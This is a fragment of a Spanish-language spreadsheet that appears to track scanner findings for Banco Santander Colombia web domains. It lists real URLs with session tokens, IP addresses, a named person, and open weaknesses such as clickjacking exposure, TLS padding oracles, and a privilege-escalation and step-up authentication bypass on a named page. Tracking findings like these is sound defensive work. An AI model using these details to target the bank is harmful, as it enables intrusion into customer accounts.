https://confirming-factoring.santander.com.co/factoring/a4j/s/3_3_3.Final/org/richfaces/skin.xcss/DATB/eAELXT5DOhSIAQ!sA18_.seam?FACTBOTTKNCSR=RLM3-5CGH-5OR8-A16I-QQKR-WKN0-2HVI-6ODO</t>
  </si>
  <si>
    <t>Los mecanismos de prevención de clickjacking más comunes son
X-Frame-Options: Se trata de una cabecera de respuesta HTTP que se utiliza para evitar el framing de la página web.
Código JavaScript Framekiller: Se puede utilizar un código JS especial para evitar que un usuario malintencionado enmarque la página. Este método es menos fiable que el uso de X-Frame-Options.</t>
  </si>
  <si>
    <t>QA-WAS-4782e1b9-e737-47ec-9ebd-753cef67a0dd</t>
  </si>
  <si>
    <t>La cabecera X-Frame-Options no se establece en la respuesta HTTP, lo que puede llevar a un posible framing de la página.
Un atacante puede engañar a los usuarios para que hagan clic en un enlace malicioso enmarcando la página original y mostrando una capa sobre ella con botones de aspecto legítimo.
https://confirming-factoring.santander.com.co/factoring/a4j/s/3_3_3.Final/org/richfaces/skin.xcss/DATB/eAELXT5DOhSIAQ!sA18_.seam?FACTBOTTKNCSR=RLM3-5CGH-5OR8-A16I-QQKR-WKN0-2HVI-6ODO</t>
  </si>
  <si>
    <t xml:space="preserve">La opción "X-Frame-Options:" permite tres opciones DENY, SAMEORIGIN y ALLOW-FROM. Se recomienda establecer "X-FRAME-OPTIONS a DENY" que no permitirá que ningún dominio enmarque el sitio o SAMEORIGIN que sólo permite el enmarcado por el mismo sitio. Todos los navegadores soportan DENY y SAMEORGIN.
Configurar "X-FRAME-OPTIONS" como ALLOW-FROM puede dejar a los usuarios vulnerables al Clickjacking ya que no todos los navegadores soportan ALLOW-FROM incluyendo CHROME y SAFARI.
Para más información, consulte https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet.
Para ver más errores de implementación de X-FRAME-OPTION, visite el siguiente enlace: 
https://blog.qualys.com/securitylabs/2015/10/20/clickjacking-a-common-implementation-mistake-that-can-put-your-websites-in-danger
</t>
  </si>
  <si>
    <t>QA-WAS-68dcae4b-7ade-4ae7-9372-3d9aaa772df2</t>
  </si>
  <si>
    <t>La página web puede estar enmarcada. Esto significa que los ataques de clickjacking contra los usuarios son posibles.
https://confirming-factoring.santander.com.co/factoring/common/mainPages/error.seam?FACTBOTTKNCSR=RLM3-5CGH-5OR8-A16I-QQKR-WKN0-2HVI-6ODO</t>
  </si>
  <si>
    <t>QA-WAS-a226d9da-3cf6-4134-b3d1-278f81927f23</t>
  </si>
  <si>
    <t>La cabecera X-Frame-Options no se establece en la respuesta HTTP, lo que puede llevar a un posible framing de la página.
Un atacante puede engañar a los usuarios para que hagan clic en un enlace malicioso enmarcando la página original y mostrando una capa sobre ella con botones de aspecto legítimo.
https://confirming-factoring.santander.com.co/factoring/common/mainPages/error.seam?FACTBOTTKNCSR=RLM3-5CGH-5OR8-A16I-QQKR-WKN0-2HVI-6ODO</t>
  </si>
  <si>
    <t>QA-WAS-f8bc994f-cd2b-4f55-8409-5b248f3d809e</t>
  </si>
  <si>
    <t>La página web puede estar enmarcada. Esto significa que los ataques de clickjacking contra los usuarios son posibles.
https://confirming-factoring.santander.com.co/factoring/common/mainPages/main.seam?FACTBOTTKNCSR=RLM3-5CGH-5OR8-A16I-QQKR-WKN0-2HVI-6ODO&amp;cid=1883&amp;conversationPropagation=end</t>
  </si>
  <si>
    <t>QA-WAS-d3918046-2c87-4917-9a1b-723b19c488b7</t>
  </si>
  <si>
    <t>La cabecera X-Frame-Options no se establece en la respuesta HTTP, lo que puede llevar a un posible framing de la página.
Un atacante puede engañar a los usuarios para que hagan clic en un enlace malicioso enmarcando la página original y mostrando una capa sobre ella con botones de aspecto legítimo.
https://confirming-factoring.santander.com.co/factoring/common/mainPages/main.seam?FACTBOTTKNCSR=RLM3-5CGH-5OR8-A16I-QQKR-WKN0-2HVI-6ODO&amp;cid=1883&amp;conversationPropagation=end</t>
  </si>
  <si>
    <t>La opción "X-Frame-Options:" permite tres opciones DENY, SAMEORIGIN y ALLOW-FROM. Se recomienda establecer "X-FRAME-OPTIONS a DENY" que no permitirá que ningún dominio enmarque el sitio o SAMEORIGIN que sólo permite el enmarcado por el mismo sitio. Todos los navegadores soportan DENY y SAMEORGIN.
Configurar "X-FRAME-OPTIONS" como ALLOW-FROM puede dejar a los usuarios vulnerables al Clickjacking ya que no todos los navegadores soportan ALLOW-FROM incluyendo CHROME y SAFARI.
Para más información, consulte https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet.
Para ver más errores de implementación de X-FRAME-OPTION, visite el siguiente enlace: 
https://blog.qualys.com/securitylabs/2015/10/20/clickjacking-a-common-implementation-mistake-that-can-put-your-websites-in-danger</t>
  </si>
  <si>
    <t>DNSSEC</t>
  </si>
  <si>
    <t>La zona principal no está firmada.
La zona principal devuelve un registro NSEC o NSEC3 para demostrar que DNSSEC no está configurado en un dominio.
Tipo de registro: NSEC3
Algoritmo hash: SHA1
Banderas: Optar por no
Iteraciones: 1
Hash anterior: N5B6GC4NA9Q3JSO7SFOD3L5HC67VSTPO
Grabar Hash: LOGPGKBREB3R76EEMJO28KDBFTRJ4E9N
Siguiente hash: N5BEVQEU1FUHADAAV7KCKOBL9EEJ9TBL
Sal: F873A2F5</t>
  </si>
  <si>
    <t>https://blog.inittab.org/administracion-sistemas/dnssec-asegurando-las-respuestas-de-nuestro-dominio-la-practica-ii/</t>
  </si>
  <si>
    <t>bancosantander.com.co</t>
  </si>
  <si>
    <t>La zona principal no está firmada.
La zona principal devuelve un registro NSEC o NSEC3 para demostrar que DNSSEC no está configurado en un dominio.
Tipo de registro: NSEC3
Algoritmo hash: SHA1
Banderas: Optar por no
Iteraciones: 1
Hash anterior: N5B6GC4NA9Q3JSO7SFOD3L5HC67VSTPO
Grabar Hash: 04RV0SHP2L0KKFEV063LIB9BBF0E3MP7
Siguiente hash: N5BEVQEU1FUHADAAV7KCKOBL9EEJ9TBL
Sal: F873A2F5</t>
  </si>
  <si>
    <t>Jorge Arturo Guzman Sanchez</t>
  </si>
  <si>
    <t>Open Ports</t>
  </si>
  <si>
    <t>Servicio detectado: HTTP (potencial vulnerabilidad de ROBOT)
ROBOT es una vulnerabilidad de RSA que permite a los atacantes registrar pasivamente el tráfico y luego descifrarlo.
Método de transporte:TCP
Servidor: BigIP
Destino de redireccionamiento: https://www.santander.com.co
Estado: HTTP / 1.0 302 movido temporalmente</t>
  </si>
  <si>
    <t>Actualice todos los paquetes de software y hardware afectados que sean vulnerables a esta vulnerabilidad. Consulte la lista de proveedores empresariales afectados que han publicado actualizaciones que corrigen esta vulnerabilidad. Si los parches no están disponibles para el hardware de la organización, desactive los cifrados que comienzan con TLS_RSA.
https://robotattack.org/#patches</t>
  </si>
  <si>
    <t>QA-VM--8955446863370336762</t>
  </si>
  <si>
    <t>204.93.139.149</t>
  </si>
  <si>
    <t xml:space="preserve">Este QID informa de la ausencia de las siguientes cabeceras HTTP según CWE-693: Fallo del mecanismo de protección:
X-Frame-Options: Esta cabecera de respuesta HTTP mejora la protección de las aplicaciones web contra los ataques de clickjacking. El clickjacking, también conocido como "ataque de redireccionamiento de la interfaz de usuario", permite a un atacante utilizar múltiples capas transparentes u opacas para engañar a un usuario objetivo para que haga clic en un botón o enlace en otra página cuando su intención era hacer clic en la página de nivel superior. 
Protección X-XSS: Esta cabecera HTTP activa el filtro de Cross-Site Scripting (XSS) integrado en el navegador para evitar ataques de cross-site scripting. Protección X-XSS: 0; desactiva esta funcionalidad.
X-Content-Type-Options: Esta cabecera HTTP evita los ataques basados en la falta de coincidencia del tipo MIME. El único valor posible es nosniff. Si su servidor devuelve X-Content-Type-Options: nosniff en la respuesta, el navegador se negará a cargar los estilos y scripts en caso de que tengan un tipo MIME incorrecto. 
Strict-Transport-Security: La cabecera de respuesta HTTP Strict-Transport-Security (HSTS) es una característica de seguridad que permite a un sitio web indicar a los navegadores que sólo debe comunicarse con él utilizando HTTPS, en lugar de utilizar HTTP.
Lógica de detección de QID:
Este QID no autenticado busca la presencia de las siguientes respuestas HTTP:
Las directivas válidas para X-Frame-Options son:
X-Frame-Options: DENY - La página no puede mostrarse en un marco, independientemente de que el sitio lo intente.
X-Frame-Options: SAMEORIGIN - La página sólo puede mostrarse en un marco del mismo origen que la propia página.
X-Frame-Options: ALLOW-FROM RESOURCE-URL - La página sólo puede mostrarse en un marco en el origen especificado.
Las directivas válidas para X-XSS-Protections son:
X-XSS-Protection: 1 - Activa el filtrado XSS (normalmente por defecto en los navegadores). Si se detecta un ataque de cross-site scripting, el navegador sanea la página (elimina las partes no seguras).
Protección X-XSS: 1; mode=block - Activa el filtrado XSS. En lugar de desinfectar la página, el navegador impedirá la visualización de la página si se detecta un ataque.
X-XSS-Protection: 1; report=URI - Activa el filtrado XSS. Si se detecta un ataque de cross-site scripting, el navegador desinfectará la página e informará de la violación. Esto utiliza la funcionalidad de la directiva CSP report-uri para enviar un informe.
Protección X-XSS: 0 desactiva esta directiva y, por tanto, también se trata como no detectada.
Una directiva válida para X-Content-Type-Options: nosniff
Una directiva HSTS válida Strict-Transport-Security: max-age=&lt;expire-time&gt;; [; includeSubDomains][; preload]
</t>
  </si>
  <si>
    <t>CWE-693: Fallo del mecanismo de protección menciona lo siguiente - El producto no utiliza o utiliza incorrectamente un mecanismo de protección que proporciona una defensa suficiente contra los ataques dirigidos contra el producto. Un mecanismo de protección "insuficiente" se produce cuando la aplicación no define ningún mecanismo contra una determinada clase de ataque. Un mecanismo de protección "insuficiente" puede proporcionar algunas defensas -por ejemplo, contra los ataques más comunes- pero no protege contra todo lo que se pretende. Por último, un mecanismo "ignorado" ocurre cuando un mecanismo está disponible y en uso activo dentro del producto, pero el desarrollador no lo ha aplicado en alguna ruta de código.
Se aconseja a los clientes que establezcan las cabeceras de respuesta HTTP X-Frame-Options, X-XSS-Protection, X-Content-Type-Options y Strict-Transport-Security adecuadas.
Dependiendo de su software de servidor, los clientes pueden establecer directivas en la configuración de su sitio o en los archivos Web.config. Algunos ejemplos son
X-Frame-Options:
Apache: El encabezado siempre añade X-Frame-Options SAMEORIGIN
nginx: add_header X-Frame-Options SAMEORIGIN;
HAProxy: rspadd X-Frame-Options:\ SAMEORIGIN
IIS: &lt;HTTPPROTOCOL&gt;&lt;CUSTOMHEADERS&gt;&lt;ADD NAME="X-Frame-Options" VALUE="SAMEORIGIN"&gt;&lt;/ADD&gt;&lt;/CUSTOMHEADERS&gt;&lt;/HTTPPROTOCOL&gt;
Protección X-XSS:
Apache: El encabezado siempre establece X-XSS-Protection "1; mode=block" 
PHP: header("X-XSS-Protection: 1; mode=block");
X-Content-Type-Options:
Apache: El encabezado siempre se establece X-Content-Type-Options: nosniff
HTTP Strict-Transport-Security:
Apache: Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
Nginx: add_header Strict-Transport-Security max-age=31536000;</t>
  </si>
  <si>
    <t>QA-WAS-50c866aa-e8b0-41d8-8226-ca5e66d06f41</t>
  </si>
  <si>
    <t>Se descubrió un archivo, directorio o listado de directorios potencialmente sensible en el servidor web.
URL: https://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2fWeb%2fApp_Themes%2fLogin%2fImages%2fcss%2f</t>
  </si>
  <si>
    <t>QA-WAS-b60f7eb9-3d9e-49ae-9ae1-1652f8e3b10e</t>
  </si>
  <si>
    <t>Se descubrió un archivo, directorio o listado de directorios potencialmente sensible en el servidor web.
URL: https://confirming-factoring.santander.com.co/factoring/error.htm?_event_transid=973165808</t>
  </si>
  <si>
    <t>santandersupernet.com.co</t>
  </si>
  <si>
    <t>La zona principal no está firmada</t>
  </si>
  <si>
    <t>La zona principal devuelve un registro NSEC o NSEC3 para demostrar que DNSSEC no está configurado en un dominio.</t>
  </si>
  <si>
    <t>santandersupernet.co</t>
  </si>
  <si>
    <t>DNSSEC no está configurado en este dominio</t>
  </si>
  <si>
    <t>Deberá configurar DNSSEC para su dominio, incluida la generación de claves necesarias y la actualización de registros de zona DNS en consecuencia. Consulte esta guía de DigitalOcean para obtener instrucciones que pueden ser aplicables a la configuración de su servidor, así como dnssec.net para obtener documentos prácticos relacionados con la configuración de DNSSEC.</t>
  </si>
  <si>
    <t>QA-WAS-a5dfc835-19fe-4c40-8e11-f0a102c23129</t>
  </si>
  <si>
    <t xml:space="preserve">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
App_Themes/Login/Login.css?v=H20150511_1205
App_Themes/Default/Default.css?v=H20150511_1205
App_Themes/Common/blockScreen/blockScreen.css?v=H20150615_1800
App_Themes/Login/Login.css
Ruta: https://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F
Referencias:
Inyección maligna de CSS
Ataque de sobrescritura de la ruta relativa
Un trabajo de investigación: Análisis a gran escala de la inyección de estilo por sobreescritura de ruta relativa.
</t>
  </si>
  <si>
    <t>QA-WAS-cea866e7-ee4f-4501-8c95-86e4b593296b</t>
  </si>
  <si>
    <t>TLS ROBOT Vulnerability Detected</t>
  </si>
  <si>
    <t>La vulnerabilidad TLS también se conoce como Retorno de la Amenaza Oracle de Bleichenbacher (ROBOT). ROBOT permite a un atacante obtener la clave RSA necesaria para descifrar el tráfico TLS bajo ciertas condiciones.Para detectar esto los cifradores vulnerables deben ser deshabilitados.
Pasos para deshabilitar los cifrados vulnerables</t>
  </si>
  <si>
    <t>Para ver las actualizaciones, consulte el aviso sobre el robot ROBOT
Parche:
A continuación encontrará los enlaces para descargar los parches que corrigen las vulnerabilidades:
 ROBOT</t>
  </si>
  <si>
    <t>QA-VM--6335931068602527804</t>
  </si>
  <si>
    <t>Possible Scan Interference</t>
  </si>
  <si>
    <t>Se ha detectado una posible interferencia en el escaneo.
Se debe permitir que un escaneo PCI realice un escaneo sin interferencia de sistemas de detección de intrusos o sistemas de prevención de intrusos. 
El ASV de la PCI debe publicar un fallo si se detecta una interferencia en el escaneo. 
El objetivo de este QID es garantizar que los sistemas de protección activa no bloqueen, filtren, eliminen o modifiquen los paquetes de red de un escaneo certificado PCI, ya que este comportamiento podría afectar a la capacidad de una ASV para detectar vulnerabilidades. Los Sistemas de Protección Activa pueden incluir cualquiera de los siguientes: IPS, WAF, Firewall, NGF, Dispositivo QoS, Filtro de Spam, etc. que están modificando dinámicamente su comportamiento basado en la información recogida de los patrones de tráfico. Este QID se activa si un servicio bien conocido y popular no se identifica correctamente debido a una posible interferencia de escaneo. Se incluyen servicios como FTP, SSH, Telnet, DNS, HTTP y servicios de bases de datos como MSSQL, Oracle, MySql.
-Si se detecta que un Sistema de Protección Activa impide que se complete el escaneo, los comerciantes deben realizar los cambios necesarios (por ejemplo, una lista blanca) para que el escaneo ASV pueda completarse sin impedimentos.
-Si la exploración no se bloquea activamente, los comerciantes pueden presentar una solicitud de falso positivo/excepción de la PCI con una declaración en la que se afirme que no hay ningún sistema de protección activo presente o que está bloqueando la exploración.
Además, si no hay riesgo para el entorno de datos del titular de la tarjeta, como por ejemplo que no se esté ejecutando ningún servicio web, esto también puede presentarse como una solicitud de falso positivo/excepción de la PCI y revisarse según el flujo de trabajo estándar de la PCI.
Para obtener más detalles sobre la interferencia de escaneo durante un escaneo PCI, consulte la sección Interferencia de Escaneo ASV de la Guía del Programa de Proveedores de Escaneo Aprobados de PCI DSS, versión 2.0, mayo de 2013, página 14/28.</t>
  </si>
  <si>
    <t>Ponga en la lista blanca el escáner de Qualys para que escanee sin interferencia del IDS o IPS.</t>
  </si>
  <si>
    <t>WAF</t>
  </si>
  <si>
    <t>QA-VM-772808486615251865</t>
  </si>
  <si>
    <t>X Windows Font Server Denial of Service Vulnerability</t>
  </si>
  <si>
    <t>45.60.195.69</t>
  </si>
  <si>
    <t>El servidor de fuentes X de Windows proporciona tipos de fuentes a los servidores X de la red.  Este programa de software es vulnerable a un ataque de denegación de servicio que puede inutilizar todos los servidores X dependientes.</t>
  </si>
  <si>
    <t>Si el servicio no es necesario, entonces debe cerrarlo. De lo contrario, asegúrese de que el servidor de fuentes está correctamente protegido contra el fuego.</t>
  </si>
  <si>
    <t>QA-VM--6902507575264806244</t>
  </si>
  <si>
    <t>Para ver las actualizaciones, consulte el aviso sobre el robot ROBOT
Parche:
A continuación se encuentran los enlaces para descargar los parches que corrigen las vulnerabilidades:
 ROBOT</t>
  </si>
  <si>
    <t>SecurityScorecard</t>
  </si>
  <si>
    <t>Insecure HTTPS Redirect Pattern</t>
  </si>
  <si>
    <t>El sitio HTTP redirige a los usuarios a una nueva URL de una manera que no se puede proteger con los encabezados HTTPS y HSTS. Esto deja a los usuarios abiertos a atacantes de intermediarios que pueden redirigirlos a una versión fraudulenta / falsificada del sitio deseado. Consulte el tipo de problema "El sitio no aplica HTTPS" para obtener más información sobre los escenarios de intermediario.
En la primera redirección www.santander.com.co (HTTP) no existe la cabecera Strict-Transport-Security, en la segunda santander.com.co (HTTPS) falta el flag “includesubdomains”, este redirige a www.santander.com.co (HTTPS, HSTS y includesubdomains).</t>
  </si>
  <si>
    <t>Cualquier sitio HTTP debe redirigir al usuario a una versión segura (es decir, HTTPS) del mismo dominio que se solicitó originalmente (o una versión de nivel superior / principal de ese mismo dominio). Por ejemplo, http://www.example.com solo debe redirigir a https://www.example.com o https://example.com. Esta redirección debe realizarse antes de redirigir a cualquier otro dominio o subdominio.
https://www.sentinelstand.com/article/http-strict-transport-security-hsts-canonical-www-redirects</t>
  </si>
  <si>
    <t>El sitio redirige a un dominio de una manera que limita la seguridad proporcionada por los encabezados HTTPS y HTTP Strict Transport Security (HSTS); esto deja a los usuarios vulnerables a ser redirigidos a una versión malintencionada / falsificada del sitio.</t>
  </si>
  <si>
    <t>QA-WAS-06bf2433-6277-44bf-b378-8a7ebbf90a6e</t>
  </si>
  <si>
    <t>Se descubrió un archivo, directorio o listado de directorios potencialmente sensible en el servidor web.
https://confirming-factoring.santander.com.co/administration/</t>
  </si>
  <si>
    <t>QA-WAS-30efd7c4-1994-4af8-9d3d-bdc918833444</t>
  </si>
  <si>
    <t>Same Site Scripting</t>
  </si>
  <si>
    <t>La mayoría de los servidores DNS incluyen registros de la forma
localhost. IN A 127.0.0.1
Pero si por error, el administrador omite el punto final, el registro no está completamente cualificado. Así que si el dominio es ejemplo.com, las consultas para localhost.ejemplo.com se resolverían a 127.0.0.1.
Referencia:
https://seclists.org/bugtraq/2008/Jan/270</t>
  </si>
  <si>
    <t>Las entradas no cualificadas de localhost no deben estar presentes en el servidor de nombres para los dominios que alojan sitios web con gestión de estado HTTP (cookies).</t>
  </si>
  <si>
    <t>No se puede acceder de forma segura a los sitios web del dominio afectado en un sistema multiusuario. El atacante puede engañar a otro usuario en el mismo sistema para que acceda a sitios web en el dominio afectado de tal manera que resulte en cookies con fugas de secuencias de comandos entre sitios.</t>
  </si>
  <si>
    <t>QA-WAS-3d19af4d-370a-45a2-9019-7932cdaec645</t>
  </si>
  <si>
    <t>helicopterantgrub-1</t>
  </si>
  <si>
    <t>Broken Access Controls Leading to Privilege Escalation</t>
  </si>
  <si>
    <t>El control de acceso, a veces llamado autorización, es la forma en que las aplicaciones conceden acceso a contenidos y funciones a algunos usuarios y no a otros. Implementar un control de acceso sólido y seguro suele ser un reto, ya que los usuarios pueden pertenecer a varios grupos o roles con diferentes habilidades o privilegios.
Existen vulnerabilidades de control de acceso rotas cuando un usuario puede de hecho acceder a algún recurso o realizar alguna acción a la que se supone que no puede acceder.
https://www.santander.com.co/Web/Pages/Requests/PersonalInformationChangeRequest.aspx</t>
  </si>
  <si>
    <t>Revise cada uno de los campos de los formularios a los que los usuarios acceden o envían datos y asegúrese de que las comprobaciones de autorización del lado del servidor son obligatorias.</t>
  </si>
  <si>
    <t>Un usuario estándar puede elevar sus privilegios a un usuario Administrador. Con este nivel de acceso pueden ver y modificar otros usuarios del sistema, así como alterar los permisos de productos y páginas.
Al modificar los tokens de seguridad y las contraseñas de los usuarios existentes, el atacante también puede hacerse con el control de otras cuentas.</t>
  </si>
  <si>
    <t>1ª Fecha: 19/08/2021
2ª Fecha: 26/11/2021
3ª Fecha: 25/01/2021
4ª Fecha: 04/02/2022
5ª Fecha: 04/03/2022
6ª Fecha: 06/05/2022</t>
  </si>
  <si>
    <t>helicopterantgrub-2</t>
  </si>
  <si>
    <t>Step-Up Authentication Bypass in SuperNet Profile Page</t>
  </si>
  <si>
    <t>La autenticación escalonada es el proceso por el cual se reta a un usuario a presentar formas adicionales de autenticación para proporcionar un mayor nivel de garantía de que es realmente quien dice ser. La autenticación escalonada se implementa normalmente como parte de un esquema de autenticación adaptable que busca igualar el nivel de riesgo de la solicitud con el nivel de garantía de la autenticación.
https://www.santander.com.co/Web/Pages/Requests/PersonalInformationChangeRequest.aspx</t>
  </si>
  <si>
    <t>Asegúrese de que la aplicación está rastreando correctamente la sesión del usuario y sólo proporciona acceso a las páginas sensibles una vez que la autenticación por pasos se ha completado con éxito.</t>
  </si>
  <si>
    <t>El bypass permite a los usuarios ver y editar los detalles del perfil que están protegidos por una contraseña secundaria escalonada sin el conocimiento de dicha contraseña.</t>
  </si>
  <si>
    <t>Potentially insecure policy
Ineffective headers: Content-Security-Policy</t>
  </si>
  <si>
    <t>Active</t>
  </si>
  <si>
    <r>
      <t>Esta Política de seguridad de contenido (CSP) tiene problemas que posiblemente la hagan insegura.
Content-Security-Policy: script-src</t>
    </r>
    <r>
      <rPr>
        <u/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> 'self' 'unsafe-inline' 'unsafe-eval' ;</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> object-src 'self'; form-action 'self'; connect-src 'self'; plugin-types application/pdf application/x-shockwave-flash; frame-src 'self'; frame-ancestors 'self'
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>script-src</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">: "Unsafe-eval" es inseguro , "Unsafe-inline" es inseguro
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>reporting-objective</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">: Sin directiva de informes en uso
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>code-injection-objective</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">: Prevención de inyección de código limitado
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>default-src</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>: Falta default-src</t>
    </r>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Elimine cualquier instancia de directivas “inseguras” y fuentes de “blob, datos, sistema de archivos”. Asegúrese de que sus directivas CSP estén configuradas correctamente.
Asegúrese de que sus encabezados estén implementados correctamente, como se describe en RFC-7231 . Sus encabezados no deberían permitir el almacenamiento en caché de contenido cifrado. También deben tener permisos específicos (en lugar de usar comodines u otras generalizaciones) y tener el formato adecuado.
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>script-src</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">: Elimine la palabra clave "unsafe-eval" de su política de seguridad de contenido.
Elimine la palabra clave "inseguro en línea" de su política de seguridad de contenido.
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>reporting-objective</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">: Incluya una directiva de informes con una ubicación o grupo válido.
code-injection-objective: No utilice ninguna palabra clave "insegura" y utilice hosts explícitos para las directivas de la lista de fuentes.
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>default-src</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">: Utilice la directiva default-src en su Política de seguridad de contenido (CSP)
</t>
    </r>
  </si>
  <si>
    <t>1° Fecha: 24/02/2024
2° Fecha: 07/08/2024</t>
  </si>
  <si>
    <t>Revisar con BOT la implementación, se debe realizar en la instancia web</t>
  </si>
  <si>
    <t>Certificate Is Expired</t>
  </si>
  <si>
    <t>Cuando una Autoridad de Certificación (CA) emite un certificado, incluye dos fechas: la fecha en la que el certificado empieza a ser válido y la fecha en la que deja de serlo. Si un cliente TLS (por ejemplo, un navegador web) se conecta a un servidor TLS (por ejemplo, un sitio web) y recibe un certificado caducado, el cliente TLS rechazará la conexión.
Los certificados son activos digitales que requieren ser renovados o dados de baja según un calendario.
https://tools.ietf.org/html/rfc5280#section-4.1.2.5</t>
  </si>
  <si>
    <t>Los certificados caducados impiden a los clientes TLS conectarse a los servidores.</t>
  </si>
  <si>
    <t>Los servicios que presentan certificados caducados deberían causar fallos notables, así que confirme que el servicio sigue en uso. Si el servicio no está en uso, desactívelo. De lo contrario, póngase en contacto con la CA y gestione la emisión de un nuevo certificado.
Evalúe la política de gestión de certificados de la organización para asegurarse de que los certificados se renuevan o retiran antes de su fecha de caducidad.</t>
  </si>
  <si>
    <t>QA-VM-843457312377902410</t>
  </si>
  <si>
    <t>QA-VM-5119251316125648481</t>
  </si>
  <si>
    <t>TLS Padding Oracle Vulnerability (Zombie POODLE and GOLDENDOODLE)</t>
  </si>
  <si>
    <t>CVE-2019-1559</t>
  </si>
  <si>
    <t>Se ha detectado una vulnerabilidad de oráculo de relleno TLS.
Si una aplicación encuentra un error de protocolo fatal y luego llama a SSL_shutdown() dos veces (una para enviar un close_notify, y otra para recibir uno) entonces OpenSSL puede responder de manera diferente a la aplicación que llama si se recibe un registro de 0 bytes con relleno inválido en comparación con si se recibe un registro de 0 bytes con una MAC inválida. Si la aplicación se comporta de forma diferente basándose en esto de una manera
que es detectable para el par remoto, entonces esto equivale a un oráculo de relleno que podría ser utilizado para descifrar los datos.
Lógica de detección de QID:
Este QID envía las múltiples cargas útiles de relleno tls para determinar la vulnerabilidad.
Vulnerabilidad GOLDENDOODLE encontrada con ECDHE-RSA-AES256-SHA384 en TLSv1.2
El servidor devuelve datos válidos en respuesta a un relleno válido con una MAC no válida</t>
  </si>
  <si>
    <t>Consulte la página oficial de github TLS Padding Oracles para conocer los productos afectados y los enlaces de los parches.
Parches:
A continuación se muestran los enlaces para descargar los parches que corrigen las vulnerabilidades:
 Aviso de seguridad de OpenSSL: OpenSSL</t>
  </si>
  <si>
    <t>Un atacante que pueda adoptar una posición de hombre en el medio (MitM) puede explotar esta vulnerabilidad y obtener acceso a la comunicación cifrada entre un cliente y un servidor.</t>
  </si>
  <si>
    <t>Medium Severity CVEs Patching Cadence</t>
  </si>
  <si>
    <t>CVE-2020-1971
CVE-2021-23841
CVE-2021-23840
CVE-2021-3449</t>
  </si>
  <si>
    <t>201.234.71.143</t>
  </si>
  <si>
    <t>Según los datos del escaneo, la empresa tenía una vulnerabilidad CVE de gravedad media que estaba abierta más de 90 días después de la publicación de la CVE. Las CVE de gravedad media son aquellas con una gravedad CVSS documentada entre 4,0 y 6,9. La mejor práctica es mitigar o parchear las vulnerabilidades de gravedad media en un plazo de 90 días. Los detalles de cada vulnerabilidad se enumeran en la tabla siguiente.</t>
  </si>
  <si>
    <t>Supervise las listas de CVE y los repositorios de vulnerabilidades en busca de código de explotación que pueda afectar a su infraestructura. Suscríbase a la base de datos nacional de vulnerabilidades (NVD) RSS o a otras fuentes para recibir alertas sobre nuevos exploits y vulnerabilidades a medida que se publican. Mantenga un programa de actualización regular para todo el software y hardware en uso dentro de su empresa, asegurándose de que todos los parches más recientes se implementan a medida que se publican.</t>
  </si>
  <si>
    <t>Vulnerabilidad de gravedad media vista en la red más de 90 días después de la publicación de la CVE.</t>
  </si>
  <si>
    <t>Medium-Severity Vulnerability in Last Observation</t>
  </si>
  <si>
    <t>CVE-2021-23840
CVE-2021-3449
CVE-2021-23841
CVE-2020-1971</t>
  </si>
  <si>
